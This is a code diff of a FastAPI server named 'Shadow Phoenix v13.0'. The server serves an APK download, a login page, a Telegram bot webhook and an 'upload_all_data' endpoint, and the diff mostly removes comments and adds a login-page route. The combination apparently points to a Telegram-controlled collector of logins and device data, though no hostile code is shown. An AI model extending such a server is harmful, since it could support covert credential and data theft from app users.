@@ -10,7 +10,6 @@ import string
 import json
 from datetime import datetime
 import uvicorn
-from pydantic import BaseModel
 from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
 from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
 from fastapi.middleware.cors import CORSMiddleware
@@ -53,21 +52,18 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ==================== المسار الرئيسي (للتحقق من أن الخادم يعمل) ====================
+# ==================== المسارات الأساسية ====================
 @app.get("/")
 async def root():
     return {"status": "online", "message": "Shadow Phoenix v13.0 is running"}
 
-# ==================== مسار تقديم ملف APK ====================
 @app.get("/app.apk")
 async def serve_apk():
-    """تقديم ملف APK من جذر المشروع"""
     if os.path.exists("app.apk"):
         return FileResponse("app.apk", media_type="application/vnd.android.package-archive", filename="app.apk")
     else:
         return HTMLResponse("<h1>الملف غير موجود</h1>", status_code=404)
 
-# ==================== مسار استقبال Webhook من Telegram ====================
 @app.post(f"/{BOT_TOKEN}")
 async def webhook(request: Request):
     try:
@@ -323,6 +319,10 @@ def get_login_html():
     </html>
     """
 
+@app.get("/login-page", response_class=HTMLResponse)
+async def login_page():
+    return get_login_html()
+
 # ==================== صفحة تحميل التطبيق ====================
 @app.get("/download", response_class=HTMLResponse)
 async def download_page():
@@ -428,7 +428,6 @@ async def download_page():
     """
 
 # ==================== نقاط API ====================
-
 @app.post("/api/web-login")
 async def api_web_login(data: dict):
     chat_id = data.get("chat_id")
@@ -495,7 +494,6 @@ async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
         return JSONResponse(status_code=500, content={"status": "error"})
 
 # ==================== أوامر البوت ====================
-
 @bot.message_handler(commands=['start'])
 def start(message):
     chat_id = message.chat.id
